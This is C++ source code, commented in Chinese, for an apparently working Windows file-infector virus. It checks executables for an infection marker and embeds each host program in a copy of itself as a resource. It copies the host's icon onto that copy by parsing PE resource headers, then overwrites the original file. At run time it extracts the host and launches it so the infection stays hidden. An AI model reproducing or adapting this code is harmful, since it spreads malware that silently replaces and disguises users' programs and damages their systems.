#include "stdafx.h"
#include <windows.h>
#include <iostream>
#include "Inject.h"
void CInjection::OutPut(TCHAR *szDebug)
{
	OutputDebugString(szDebug);

}
BOOL CInjection::IsInjected(TCHAR * szSrc)
{
	HMODULE hLibrary = LoadLibrary(szSrc);

	if (NULL != hLibrary)
	{
		//将模块加载入内存，并搜索是否有感染标记。假设我将感染标记记为INJECTION_RESOURCE_ID
		HRSRC hResource = FindResource(hLibrary, MAKEINTRESOURCE(INJECTION_RESOURCE_ID), RT_RCDATA);
		//如果找到被标记的资源,说明文件已被感染
		if (NULL != hResource)
		{  
			OutPut (L"This file has been injected..");
			FreeLibrary(hLibrary);
			return TRUE;
		}
		//释放内存中的映像
		FreeLibrary(hLibrary);

	}
	return FALSE;
}
int CInjection::InjectFile(TCHAR *host,BOOL modifyIcon)
{
	//存放宿主路径
	TCHAR *src=host;
	//存放返回的病毒体路径
	TCHAR szMyName[MAX_PATH];
	GetModuleFileName(NULL,szMyName,MAX_PATH);
	TCHAR currentDir[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,currentDir);
	TCHAR szTempFileA[MAX_PATH];
	wsprintf(szTempFileA,L"%s\\%s",currentDir,L"tempfile");
	HANDLE hFile;
	DWORD dwFileSize,dwBytesRead;      
	LPBYTE lpBuffer;
	HRSRC hResource;

	//不感染自己
	if (IsInjected (src)==TRUE)
	{
		return HAS_BEEN_INJECTED;
	}

	if (wcsncmp (szMyName,src,MAX_PATH) == 0)
	{
		return INJECTION_FAIL;
	}
	
	//copy myself into tempfile
	CopyFile(szMyName,szTempFileA,0);
	/*如果此文件没被感染过，开始感染此文件*/
	hFile = CreateFile(
		src, 
		GENERIC_READ, 
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if (INVALID_HANDLE_VALUE != hFile)
	{
		//取得宿主资源大小(不可省略)
		dwFileSize = GetFileSize(hFile, NULL);

		lpBuffer = new BYTE[dwFileSize];

		if (ReadFile(hFile, lpBuffer, dwFileSize, &dwBytesRead, NULL) != FALSE)
		{
			hResource = (HRSRC)BeginUpdateResource(szTempFileA, FALSE);
			if (NULL != hResource)
			{
				//感染后的结合体是szTempFileA
				if (UpdateResource(
					hResource, 
					RT_RCDATA, 
					MAKEINTRESOURCE(INJECTION_RESOURCE_ID), 
					MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
					(LPVOID) lpBuffer, 
					dwFileSize
					) != FALSE)
				{
					EndUpdateResource(hResource, FALSE);
				}
			}
		}
		delete [] lpBuffer;        
		CloseHandle(hFile);

		if (modifyIcon == TRUE)
		{
			ModifyIcon (szTempFileA,src);
		}

		//覆盖原来的文件
		CopyFile(szTempFileA,src,0);
		DeleteFile(szTempFileA);
		return INJECTION_SUCCESS;

	}
	//找不到文件，退出。
	DeleteFile(szTempFileA);
	OutPut (L"找不到宿主");
	return false;

}
int CInjection::ExportVirus()
{

	TCHAR szMyName[MAX_PATH];
	GetModuleFileName(NULL,szMyName,MAX_PATH);
	TCHAR currentDir[MAX_PATH];
	GetCurrentDirectory(MAX_PATH,currentDir);
	TCHAR szTempFileA[MAX_PATH];//病毒+宿主
	wsprintf(szTempFileA,L"%s\\%s",currentDir,L"copied.exe");
	TCHAR szTempFileB[MAX_PATH];//宿主
	wsprintf(szTempFileB,L"%s\\%s",currentDir,L"host.exe");
	HANDLE hFile;
	DWORD dwFileSize;      
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	//复制宿主(自己)到给临时文件A
	CopyFile(szMyName,szTempFileA,0);
	HRSRC hResource;
	HGLOBAL hResourceLoaded;
	LPBYTE lpBuffer;
	//映射该文件地址到内存，返回该资源的可执行模块句柄
	HMODULE hLibrary = LoadLibrary(szMyName);
	if (NULL != hLibrary)
	{
		hResource = FindResource(hLibrary, MAKEINTRESOURCE(INJECTION_RESOURCE_ID), RT_RCDATA);
		//如果找到被标记的资源,说明文件已被感染，那么我来释放宿主
		if (NULL != hResource)
		{
			hResourceLoaded = LoadResource(hLibrary, hResource);
			if (NULL != hResourceLoaded)        
			{
				lpBuffer = (LPBYTE) LockResource(hResourceLoaded);            
				if (NULL != lpBuffer)            
				{                
					DWORD dwBytesWritten;
					//获取宿主资源的大小
					dwFileSize = SizeofResource(hLibrary, hResource);
					hFile = CreateFile(szTempFileB,
						GENERIC_WRITE,
						0,
						NULL,
						CREATE_ALWAYS,
						FILE_ATTRIBUTE_NORMAL,
						NULL);

					if (INVALID_HANDLE_VALUE != hFile)
					{
						//将内存中的宿主资源写入此文件
						WriteFile(hFile, lpBuffer, dwFileSize, &dwBytesWritten, NULL);
						CloseHandle(hFile);
					}
					GetStartupInfo(&si);
					//加载运行宿主程序(关键)
					CreateProcess(szTempFileB,GetCommandLine(),NULL,
						NULL,NULL,NULL,NULL,NULL,&si,&pi);
					WaitForSingleObject(pi.hProcess, INFINITE);
					FreeLibrary(hLibrary);
					DeleteFile(szTempFileA);
					DeleteFile(szTempFileB);
					//查到系统已被感染后，不运行病毒体
					//if(what==1) 
					//{  
					//	//释放内存中的映像
					//	FreeLibrary(hLibrary);
					//	DeleteFile(szTempFileA);
					//	DeleteFile(szTempFileB);
					//	return true;
					//}
				}
			}
		}
	}
	return true;
}



/***************************************************************************
函数：获取文件中图标所在位置
****************************************************************************/
bool CInjection::GetPos(TCHAR m_path[MAX_PATH],int a)
{

	DWORD dwIconSize=0;
	DWORD dwWritePos=0;


	_IMAGE_DOS_HEADER dosHead;
	_IMAGE_NT_HEADERS ntHead;
	_IMAGE_SECTION_HEADER secHead;


	//读取PE Header
	DWORD dwBytesRead;
	HANDLE fp = CreateFile(m_path, GENERIC_READ, 
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);
	if(fp==NULL)
	{
		OutPut (L"文件不存在");
		return false;
	}

	ReadFile(fp,&dosHead,sizeof(_IMAGE_DOS_HEADER), &dwBytesRead, NULL);

	SetFilePointer(fp,dosHead.e_lfanew,NULL,FILE_BEGIN);
	ReadFile(fp,&ntHead,sizeof(_IMAGE_NT_HEADERS),&dwBytesRead,NULL);



	/*查找.rsrc节，移动文件指针到.rsrc节开始的位置*/
	for(int i=0;i<ntHead.FileHeader.NumberOfSections;i++)
	{
		ReadFile(fp,&secHead,sizeof(_IMAGE_SECTION_HEADER),&dwBytesRead,NULL);
		if(strcmp((char*)secHead.Name,".rsrc")==0)
		{

			break;
		}
	}

	_IMAGE_RESOURCE_DIRECTORY dirResource;
	//读取指针指向资源根节点开始的位置
	SetFilePointer(fp,secHead.PointerToRawData,NULL,FILE_BEGIN);

	//读取资源根节点开始的位置(在文件中的位置 )
	DWORD pos=secHead.PointerToRawData;
	ReadFile(fp,&dirResource,sizeof(_IMAGE_RESOURCE_DIRECTORY),&dwBytesRead,NULL);
	_IMAGE_RESOURCE_DIRECTORY_ENTRY entryResource={0};
	_IMAGE_RESOURCE_DIRECTORY dirTemp={0};
	_IMAGE_RESOURCE_DIRECTORY_ENTRY entryTemp={0};
	_IMAGE_RESOURCE_DIRECTORY dirTempICON={0};
	_IMAGE_RESOURCE_DIRECTORY_ENTRY entryTempICON={0};
	_IMAGE_RESOURCE_DATA_ENTRY entryData={0};

	for(int i=0;i<dirResource.NumberOfIdEntries+dirResource.NumberOfNamedEntries;i++)
	{
		ReadFile(fp,&entryResource,sizeof(_IMAGE_RESOURCE_DIRECTORY_ENTRY),&dwBytesRead,NULL);

		if(entryResource.Name==3)//该资源是图标
		{
			//读取指针指向下一层的IMAGE_RESOURCE_DIRECTORY结构
			SetFilePointer(fp,pos+entryResource.OffsetToDirectory,NULL,FILE_BEGIN);
			ReadFile(fp,&dirTemp,sizeof(_IMAGE_RESOURCE_DIRECTORY),&dwBytesRead,NULL);
			if(dirTemp.NumberOfIdEntries>256)
			{
				OutPut (L">256失败");
				return false;
			}
			//遍历各个入口点指示的目录
			for(int k=0;k<dirTemp.NumberOfIdEntries;k++)
			{ 
				ReadFile(fp,&entryTemp,sizeof(_IMAGE_RESOURCE_DIRECTORY_ENTRY),&dwBytesRead,NULL);
				//如果还有子目录
				if(entryTemp.DataIsDirectory>0) 
				{


					//读取指针指向下一层的IMAGE_RESOURCE_DIRECTORY结构
					SetFilePointer(fp,pos+entryTemp.OffsetToDirectory,NULL,FILE_BEGIN);
					ReadFile(fp,&dirTempICON,sizeof(_IMAGE_RESOURCE_DIRECTORY),&dwBytesRead,NULL);
					ReadFile(fp,&entryTempICON,sizeof(_IMAGE_RESOURCE_DIRECTORY_ENTRY),&dwBytesRead,NULL);
					SetFilePointer(fp,pos+entryTempICON.OffsetToData,NULL,FILE_BEGIN);
					ReadFile(fp,&entryData,sizeof(_IMAGE_RESOURCE_DATA_ENTRY),&dwBytesRead,NULL);

					//列出该目录下所有图标资源
					for(int i=0;i<dirTemp.NumberOfIdEntries;i++)
					{
						//列出其中符合条件的图标
						if(entryData.Size >=44)
						{

							//图标大小
							dwIconSize=entryData.Size;
							//图标起始位置
							dwWritePos=pos+entryData.OffsetToData - secHead.VirtualAddress;


							//将图标资源信息存入全局数组
							if(a==1)
							{
								dwSize1[i]=dwIconSize;
								dwPos1[i]=dwWritePos;
							}
							if(a==2)
							{
								dwSize2[i]=dwIconSize;
								dwPos2[i]=dwWritePos;
							}



						}
						SetFilePointer(fp,pos+entryTempICON.OffsetToData+
							(i+1)*sizeof(_IMAGE_RESOURCE_DATA_ENTRY),NULL,FILE_BEGIN);
						ReadFile(fp,&entryData,sizeof(_IMAGE_RESOURCE_DATA_ENTRY),&dwBytesRead,NULL);

					}

				}


			}


		}


	}
	CloseHandle(fp);
	//将图标资源个数存入全局数组
	if(a==1)
	{
		count1=dirTemp.NumberOfIdEntries;
		if(count1>256)
			return false;
		//实现按从大到小排序
		int i,j;
		DWORD tempS,tempP;
		for(i=0;i<count1-1;i++)
			for(j=count1-1;j>i;j--)
				if(dwSize1[j]>dwSize1[j-1])
				{
					tempS=dwSize1[j];
					tempP=dwPos1[j];
					dwSize1[j]=dwSize1[j-1];
					dwPos1[j]=dwPos1[j-1];
					dwSize1[j-1]=tempS;
					dwPos1[j-1]=tempP;


				}

	}
	if(a==2)
	{
		count2=dirTemp.NumberOfIdEntries;
		if(count2>256)
			return false;
		//实现按从大到小排序
		int i,j;
		DWORD tempS,tempP;
		for(i=0;i<count2-1;i++)
			for(j=count2-1;j>i;j--)
				if(dwSize2[j]>dwSize2[j-1])
				{
					tempS=dwSize2[j];
					tempP=dwPos2[j];
					dwSize2[j]=dwSize2[j-1];
					dwPos2[j]=dwPos2[j-1];
					dwSize2[j-1]=tempS;
					dwPos2[j-1]=tempP;


				}
	}

	return true;
}




/***************************************************************************
函数：修改图标
将szSrc的图标写入szDst内
****************************************************************************/
int CInjection::ModifyIcon(TCHAR szDst[256],TCHAR szSrc[256])
{
	char* SrcBuf;
	int sum;
	if(!GetPos(szSrc,1))
	{
		OutPut (L"if(!GetPos(szSrc,1))处失败");
		return false;
	}


	if(!GetPos(szDst,2))
	{
		OutPut (L"2失败");
		return false;
	}
	if(dwSize2[0]<dwSize1[count1-1])
	{
		OutPut (L"都不合适!");
		return false;
	}
	//多数服从少数
	if(count1>count2||count1==count2)
	{
		sum=count2;
		for(int i=0;i<sum;i++)
		{
			for(int a=0;(a+i)<count1;a++)
			{
				if(dwSize1[a+i]==dwSize2[i]||dwSize1[a+i]<dwSize2[i])
				{

					/*读取宿主文件图标数据*/
					DWORD dwBytesRead , dwByteWritten;
					HANDLE fp = CreateFile(szSrc, GENERIC_READ, 
						0,
						NULL,
						OPEN_EXISTING,
						FILE_ATTRIBUTE_NORMAL,
						NULL);
					SetFilePointer(fp,dwPos1[a+i],NULL,FILE_BEGIN);
					SrcBuf = new char [dwSize1[a+i]];
					ReadFile(fp,SrcBuf,dwSize1[a+i],&dwBytesRead,NULL);
					CloseHandle(fp);

					//写入
					HANDLE ff = CreateFile(szDst,GENERIC_WRITE|GENERIC_READ,
						0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
					SetFilePointer(ff,dwPos2[i],NULL,FILE_BEGIN);
					WriteFile(ff,SrcBuf,dwSize1[a+i],&dwByteWritten,NULL);
					CloseHandle(ff);
					return true;
				}

			}
		}
	}
	else
	{

		sum=count1;
		for(int i=0;i<sum;i++)
		{
			for(int a=0;(a+i)<count2;a++)
			{
				if(dwSize2[a+i]==dwSize1[i]||dwSize2[a+i]>dwSize1[i])

				{
					/*读取宿主文件图标数据*/
					DWORD dwBytesRead , dwByteWritten;
					HANDLE fp = CreateFile(szSrc, GENERIC_READ, 
						0,
						NULL,
						OPEN_EXISTING,
						FILE_ATTRIBUTE_NORMAL,
						NULL);
					SetFilePointer(fp,dwPos1[i],NULL,FILE_BEGIN);
					SrcBuf = new char [dwSize1[i]];
					ReadFile(fp,SrcBuf,dwSize1[i],&dwBytesRead,NULL);
					CloseHandle(fp);

					//写入
					HANDLE ff = CreateFile(szDst,GENERIC_WRITE|GENERIC_READ,
						0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
					SetFilePointer(ff,dwPos2[a+i],NULL,FILE_BEGIN);
					WriteFile(ff,SrcBuf,dwSize1[i],&dwByteWritten,NULL);
					CloseHandle(ff);
					return true;
				}

			}
		}

	}
	return true;
}
